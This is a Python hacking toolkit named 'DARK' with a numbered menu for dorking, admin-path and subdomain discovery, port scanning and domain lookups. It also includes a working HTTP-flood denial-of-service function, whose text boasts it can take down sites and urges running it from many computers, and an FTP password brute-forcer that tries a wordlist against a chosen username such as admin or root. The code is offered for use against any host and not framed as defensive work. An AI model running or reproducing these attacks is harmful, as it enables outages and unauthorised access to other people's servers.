#!/usr/bin/env python

from Core.ban import *
from Core.Loding import *
from Modules.Request_dork import *
from Modules.Request_path import *
from Modules.subdomain import *
from Core.Colors import *
import sys
import os
import requests , platform , re , urllib.parse , urllib.error , urllib.request , socket , sys
from subprocess import call
from datetime import datetime
from pathlib import Path
from random import choice

user_agents = (
    "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
    "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0",
    "Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7",
    "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
    "Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1"
)


def Top(s):
	for ASU in s + '\n':
		sys.stdout.write(ASU)
		sys.stdout.flush()
		sleep(50. / 700)
# know system is
def page_links():
	r=requests.session()
	sn_ip = input('[?] Enter the website link example: google.com : ')
	try:
	   webIP = sn_ip.split('.')[1]
	except IndexError:
	    print('[-] Please enter a valid link')
	    print('[-] Example: www.instagram.com')
	    input('')
	    exit()
	try:
	   IPhost = socket.gethostbyname(sn_ip)
	except socket.gaierror:
	    print('[!] The domain name is incorrect, please check it')
	    input('')
	    exit()
	print(r.get(f'https://api.hackertarget.com/pagelinks/?q=www.{webIP}.com').text)
	
	
	
def dos(host):
    Top("\n[*]This program will use HTTP FLOOD to dos the host.\n[*]It would work only on small websites if done only for one computer.\n[*]To take down larger websites run the attack from multiple computers.\n[*] For better performance open multiple instances of this software and attack at the same time.\n")
    print("[*]Host to attack: "+host)
    ip = socket.gethostbyname(host)
    print("[*]IP of the host: "+ip+"\n\n")
    conn = input(
        "Enter the number of packets to be sent(depends on the site but should be more than 2000 or 3000 for average sites): ")
    conn = int(conn)

    for i in range(conn):
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        except:
            print("Unable to create Socket. Retrying.")
            continue
        try:
            s.connect((ip, 80))
        except:
            print("Unable To Connect. Retrying.")
            continue
        print("[*]FLOODING!")
        s.send("GET / HTTP/1.1\r\n".encode())
        s.send("Host: ".encode()+host.encode()+"\r\n".encode())
        s.send("User-Agent: ".encode()+choice(user_agents).encode()+"\r\n\r\n".encode())
        s.close()
	
def WEB_Scanner():
	r=requests.session()
	sn_ip = input('[?] Enter the website Domain example: google.com : ')
	try:
	   webIP = sn_ip.split('.')[1]
	except IndexError:
	    print('[-] Please enter a valid link')
	    print('[-] Example: www.instagram.com')
	    input('')
	    exit()
	try:
	   IPhost = socket.gethostbyname(sn_ip)
	except socket.gaierror:
	    print('[!] The domain name is incorrect, please check it')
	    input('')
	    exit()

	headers ={
	'Host': f'{webIP}.com.w3snoop.com',
	'User-Agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0',
	'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
	'Accept-Language': 'en-US,en;q=0.5',
	'Accept-Encoding': 'gzip, deflate',
	'Upgrade-Insecure-Requests': '1',
	'Sec-Fetch-Dest': 'document',
	'Sec-Fetch-Mode': 'navigate',
	'Sec-Fetch-Site': 'none',
	'Sec-Fetch-User': '?1',
	'Cache-Control': 'max-age=0',
	'Te': 'trailers',
	'Connection': 'close'}
	send = r.get(f'https://{webIP}.com.w3snoop.com/',headers=headers).text
	Server_IP =re.findall('class=text-primary>Server IP Address:<td>(.*?)<tr><td',send)
	inline =re.findall(f'class=d-inline>(.*?)</h2><div>(.*?)</div>',send)
	age =re.findall(f'class=text-primary>Age:<td>(.*?)<tr><td',send)
	Dmn_Created =re.findall(f'class=text-primary>Domain Created:<td>(.*?)<tr><td',send)
	Dmn_Updated =re.findall(f'class=text-primary>Domain Updated:<td>(.*?)<tr><td',send)
	Dmn_Expires =re.findall(f'class=text-primary>Domain Expires:<td>(.*?)</table>',send)
	print(inline[0])
	print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n')
	Country =re.findall(f'class=text-primary>Country:<td>(.*?)<br><img',send)
	print('[+] Country: '+ Country[0])
	print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n')
	print('[+] Information about the domain: ')
	print('[+] Age: '+age[0])
	print('[+] Domain Created: '+Dmn_Created[0])
	print('[+] Domain Updated: '+Dmn_Updated[0])
	print('[+] Domain Expires: '+Dmn_Expires[0])
	print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n')
	print('[+] IP wepsite: '+str(IPhost))
	print('[+] Server IP Address : '+str(Server_IP[0]))
	if 'instagram.com' in send:
		print('DNS Lookup :\n [    Host	     IP Address	      TTL ]')
		ip5 =re.findall(f'class=snoop-table-alt-heading>TTL</span><tbody><tr><td>(.*?)<td>(.*?)<td>IN<td>(.*?)<tr><td>(.*?)<td>(.*?)<td>IN<td>(.*?)<tr><td>(.*?)<td>(.*?)<td>IN<td>(.*?)<tr><td>(.*?)<td>(.*?)<td>IN<td>(.*?)<tr><td>(.*?)<td>(.*?)<td>IN<td>(.*?)<tr><td>(.*?)<td>(.*?)<td>IN<td>(.*?)<tr><td>(.*?)<td>(.*?)<td>IN<td>(.*?)<tr><td>(.*?)<td>(.*?)<td>IN<td>(.*?)</table>',send)
		print(ip5[0])
	elif 'tiktok.com' in send:
		print('DNS Lookup :\n [    Host	     IP Address	      TTL ]')
		tikHOST =re.findall(f'class=snoop-table-alt-heading>TTL</span><tbody><tr><td>(.*?)<td>(.*?)<td>(.*?)<td>(.*?)<tr><td>(.*?)<td>(.*?)<td>(.*?)<td>(.*?)</table>',send)
		print(tikHOST[0])
	elif 'snapchat.com' in send:
		print('DNS Lookup :\n [    Host	     IP Address	      TTL ]')
		snapHOST =re.findall(f'class=snoop-table-alt-heading>TTL</span><tbody><tr><td>(.*?)<td>(.*?)<td>(.*?)<td>(.*?)<tr><td>(.*?)<td>(.*?)<td>(.*?)<td>(.*?)<tr><td>(.*?)<td>(.*?)<td>(.*?)<td>(.*?)<tr><td>(.*?)<td>(.*?)<td>(.*?)<td>(.*?)</table>',send)
		print(snapHOST[0])	
	else:
		try:
			print('DNS Lookup :\n [    Host	     IP Address	      TTL ]')
			none =re.findall(f'class=snoop-table-alt-heading>TTL</span><tbody><tr><td>(.*?)<td>(.*?)<td>(.*?)<td>(.*?)<tr><td>(.*?)<td>(.*?)<td>(.*?)<td>(.*?)<tr><td>(.*?)<td>(.*?)<td>(.*?)<td>(.*?)<tr><td>(.*?)<td>(.*?)<td>(.*?)<td>(.*?)</table>',send)
			print(none[0])
		except IndexError:
			pass
	print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n')
	try:
		Safety =re.findall(f'class=not-available></div><tr><td>WOT Trustworthiness:<td>(.*?)<tr><td>WOT Child Safety:<td>(.*?)</table>',send)
		print('[+]WOT Trustworthiness | WOT Child Safety')
		print('\t\t \t\t'+str(Safety[0]))
		print('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\n')
	except IndexError:
			pass
		
	else:
		input('Enter to exit')
		exit()
	
def scanner(host):
    

    t1 = datetime.now()
    socket.setdefaulttimeout(2)
    print("[*] Scanning "+host)
    print("[*] Starting Scanning at "+str(t1))
    host = socket.gethostbyname(host)
    print("[*] IP of host: "+host)
    ports = [1, 5, 7, 18, 20, 21, 22, 23, 25, 43, 42, 53, 80, 109,
             110, 115, 118, 443, 194, 161, 445, 156, 137, 139, 3306]
    try:
        for port in ports:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            result = sock.connect_ex((host, port))
            if result == 0:
                print("Port {}: \t Open".format(port))
            sock.close()

    except KeyboardInterrupt:
        return print("You pressed Ctrl+C")
    except socket.gaierror:
        return print('Hostname could not be resolved. Exiting')
    except socket.error:
        return print("Couldn't connect to server")

    t2 = datetime.now()
    timetaken = t2-t1
    print("[*] Scanning ended at: "+str(t2)+"\n")
    print("[*] Time taken= "+str(timetaken))

operSys = platform.system()

def ask_host():
    hostname = input(
        "Enter hostname or IP address (google.com, www.yoursite.com, 192.168.1.1): ")
    if '://' in hostname:
        hostname = hostname.split('://')[1]
    return hostname
def clear_scr():
    if operSys == "Windows":
        call('cls', shell=True)
    if operSys == "Linux":
        call('clear', shell=True)
        
        
      
def ftp(server):

 
    print("[*]Put the password file in the same directory.\n[*]The passwords should be on different lines.\n")

    passwords = ask_file().read_text().splitlines()

    username = input("Enter the username to hack(eg: admin, root): ")



    server = socket.gethostbyname(server)

    try:

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    except:

        return print("Unable to create Socket.")

    try:

        s.connect((server, 21))

    except:

        return print("Unable To Connect.")

    data = s.recv(1024)

    for password in passwords:

        s.send('USER '.encode() + username.encode() + '\r\n'.encode())

        data = s.recv(1024)

        s.send('PASS '.encode() + password.encode()+'\r\n'.encode())

        data = s.recv(1024).decode()

        print(data)

        print("[*] Tried: "+password+"\n")

        if "230" in data:

            print("password found\n")

            return print("[*] Password is: " + password)

        else:

            print('[*] '+password+" is incorrect")

    s.send("Quit\r\n".encode())

    s.close

    print("No password Found. Try another word list or username.")



        
  
def ask_file():

    while 1:

        path = Path(input(

            f"Enter the file name (eg: pass.txt, wordlist.txt)\n>"))

        if not path.is_file():

            print('[!] No such file!')

            continue

        return path



def DARK():
    # OS is ?
    sys_info = sys.platform
    if sys_info == 'linux':
        os.system('clear')
    else:
        os.system('cls')

    # banner
    BAN_DARK()

    # choose number
    choice = int(input(f'[{Purple}*{White}] Choose number :'))
    
    if choice == 99 :
        print('\nGood bye ...')
        exit()
    

    # domain like ---> google.com
    
    # ....
    loding()

    if choice == 1:
        url_web = input(f'\n[{Purple}*{White}] ENTER DOMINE WEB example: www.google.com : ')

        RGD = DORK(url_web)
        RGD.req_google_dork()
    elif choice == 5:
    	page_links()

    elif choice == 2:
        if sys_info == 'linux':
            os.system('clear')
        else:
            os.system('cls')

        BAN_TRACKS()
        y0n = int(input(f'[{Purple}*{White}] Choose number :'))
        if y0n == 99 :
            DARK()
        http_https = int(input(f'[{Cyan}1{White}] HTTP OR [{Red}2{White}] HTTPS :'))
        loding()

        if y0n == 1:
            url_web = input(f'\n[{Purple}*{White}] ENTER DOMINE WEB example: www.google.com : ')
            Attack = Tracks(url_web, http_https)
            Attack.PHP()

        elif y0n == 2:
            url_web = input(f'\n[{Purple}*{White}] ENTER DOMINE WEB example: www.google.com : ')
            # HTML
            Attack = Tracks(url_web, http_https)
            Attack.HTML()

        elif y0n == 3:
            url_web = input(f'\n[{Purple}*{White}] ENTER DOMINE WEB example: www.google.com : ')
            # WORD PRESS
            Attack = Tracks(url_web, http_https)
            Attack.WORD_PREES()

        elif y0n == 4 :
            url_web = input(f'\n[{Purple}*{White}] ENTER DOMINE WEB example: www.google.com : ')
            Attack = Tracks(url_web, http_https)
            Attack.Admins()

        elif y0n == 5 :
            url_web = input(f'\n[{Purple}*{White}] ENTER DOMINE WEB example: www.google.com : ')
            Attack = Tracks(url_web, http_https)
            Attack.PHP()
            Attack.HTML()
            Attack.WORD_PREES()
            Attack.Admins()


        elif y0n == 6:
            url_web = input(f'\n[{Purple}*{White}] ENTER DOMINE WEB example: www.google.com : ')
            file_for_tracks = input(f'[{Purple}*{White}] Enter name file :')
            
            Attack = Tracks(url_web, http_https, file_for_tracks)
            Attack.OTHER()
        
        
        else :
            print(f'{Red} Error number !! {White}')
            DARK()
    elif choice == 3 :
        url_web = input(f'\n[{Purple}*{White}] ENTER DOMINE WEB example: www.google.com : ')

        loding()
        os.system('clear')
        BAN_SUBDOMIN()

        choose = int(input(f'[{Purple}*{White}] Choose number :'))
        loding()
        if choose == 1 :
            HTTP_HTTPS = int(input(f'[{Cyan}1{White}] HTTP or [{Red}2{White}] HTTPS :'))
            FILE = open('Modules/Paths/domains.txt', 'r')
            Sub = Subdomains(url_web, HTTP_HTTPS, FILE)
            Sub.subdomins()

        elif choose == 2 :

            HTTP_HTTPS = int(input(f'[{Cyan}1{White}] HTTP or [{Red}2{White}] HTTPS :'))
            FILE = open(input(f'[{Purple}*{White}] Enter name file subdomains :'), 'r')

            Sub = Subdomains(url_web, HTTP_HTTPS, FILE)
            Sub.subdomins_your_file()
        elif choose == 99 :
            DARK()
    elif choice == 4:
            WEB_Scanner()
    elif choice == 7:
            hostname = ask_host()
            ftp(hostname)
    elif choice == 8:
            hostname = ask_host()
            dos(hostname)
    elif choice == 6:
    	hostname = ask_host()
    	scanner(hostname)
    elif choice == 99 :
        print('\nGood bye ...')
        exit()
    
        
DARK()
